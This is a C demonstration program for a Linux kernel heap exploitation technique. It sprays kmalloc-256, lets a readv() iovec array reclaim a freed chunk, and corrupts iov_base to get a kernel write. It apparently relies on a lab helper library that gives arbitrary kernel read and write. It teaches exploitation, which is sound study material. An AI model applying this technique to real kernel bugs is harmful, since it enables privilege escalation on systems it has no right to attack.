#include "./lib/krwx.h"
#include <sys/uio.h>


int main(){
	// Spray kmalloc-256
	printf("[*] Spraying kmalloc-256 ..\n");
	for(int i=0; i < 1000; i++) kmalloc(265, GFP_KERNEL);
	
	// Initialize pipe file descriptors
	int pipefd[2];
	pipe(pipefd);

	// Initalize iovec struct
    // 13 * 16 = 208 => kmalloc-256
	struct iovec iov_read_buffers[13] = {0};
	char read_buffer0[0x100];
	char read_buffer1[0x100];
	char read_buffer2[0x100];
	char read_buffer3[0x100];
	iov_read_buffers[0].iov_base = read_buffer0;
	iov_read_buffers[0].iov_len= 0x10;
	iov_read_buffers[1].iov_base = read_buffer1;
	iov_read_buffers[1].iov_len= 0x10;
	iov_read_buffers[8].iov_base = read_buffer2;
	iov_read_buffers[8].iov_len= 0x10;
	iov_read_buffers[12].iov_base = read_buffer3;
	iov_read_buffers[12].iov_len= 0x10;

	void* chunk = kmalloc(256, GFP_KERNEL);
	if(!fork()){
		kfree(chunk); // the iovec struct will re-place this allocation
		printf("[*] Allocating the iovec struct in the kernel using readv() ..\n");
		readv(pipefd[0], iov_read_buffers, 13); // Blocking (use another thread or fork())	
	}

	// Waits the readv allocation
	sleep(1);
	printf("[*] iovec chunk in memory:\n");
	read_memory(chunk, 0x40);
	printf("[*] Writing 0x4141414141414141 in iov[1].base\n");
	kwrite64(chunk + 0x10, 0x4141414141414141);
	printf("[*] iovec chunk in memory after corruption:\n");
	read_memory(chunk, 0x40);

	char write_buf[0x1000];
	memset(write_buf, 0x41, 0x1000);
	printf("[*] Writing into the pipe (backed by the previously allocated iovec struct in the kernel)\n");
	printf("[*] The first 0x10 bytes will be written in iov[0].base and the next 0x20 in iov[1].base (corrupted)\n");
	printf("[*] This should trigger a fault\n");
	write(pipefd[1], write_buf, 0x20);
}

